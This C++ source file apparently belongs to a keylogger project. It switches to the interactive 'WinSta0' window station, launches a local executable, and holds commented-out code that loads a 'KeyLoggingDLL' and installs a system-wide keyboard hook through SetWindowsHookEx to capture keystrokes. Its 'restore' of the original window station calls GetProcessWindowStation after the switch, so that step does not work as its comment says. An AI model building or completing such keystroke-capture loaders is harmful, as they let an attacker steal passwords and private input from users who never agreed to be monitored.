#include <stdio.h>
#include <iostream>

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <string.h>

#define no_init_all deprecated



bool CreateProcessInWindowStation()
{
	// Step 1: Obtain a handle to the target window station
	HWINSTA hWinSta = OpenWindowStation(L"WinSta0", FALSE, READ_CONTROL | WRITE_DAC);
	if (hWinSta == nullptr)
	{
		std::cout << "Failed to open window station. Error: " << GetLastError() << std::endl;
		return false;
	}

	// Step 2: Switch to the desired window station
	if (!SetProcessWindowStation(hWinSta))
	{
		std::cout << "Failed to set window station. Error: " << GetLastError() << std::endl;
		CloseWindowStation(hWinSta);
		return false;
	}

	// Step 3: Create the process
	STARTUPINFO si = {};
	si.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION pi = {};

	if (!CreateProcess(
		L"C:\\Users\\ISE\\source\\repos\\WinSta0\\x64\\Debug\\WinSta0.exe",                // Module name (use command line)
		NULL,  // Command line
		NULL,                // Process attributes
		NULL,                // Thread attributes
		FALSE,                  // Inherit handles
		0,                      // Creation flags
		NULL,                // Environment variables
		NULL,                // Current directory
		&si,                    // Startup info
		&pi                     // Process info
	))
	{
		std::cout << "Failed to create process. Error: " << GetLastError() << std::endl;
		CloseWindowStation(hWinSta);
		return false;
	}

	// Step 4: Restore the original window station
	SetProcessWindowStation(GetProcessWindowStation());

	// Cleanup
	CloseWindowStation(hWinSta);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return true;
}

int main()
{
	const char* windowStationName = "WinSta0";

	CreateProcessInWindowStation();

	/*const wchar_t* dll_path = L"C:\\Users\\ISE\\source\\repos\\KeyLoggingDLL\\x64\\Debug\\KeyLoggingDLL.dll";
	HMODULE dll = LoadLibraryEx(dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);

	HOOKPROC hookproc = (HOOKPROC)GetProcAddress(dll, "KeyboardHookProc");
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookproc, dll, 0);


	int d = 0;
	while (d != 1)
	{
		scanf("%d", &d);
	}
	printf("Out");
	UnhookWindowsHookEx(hook);
	return 0;*/
}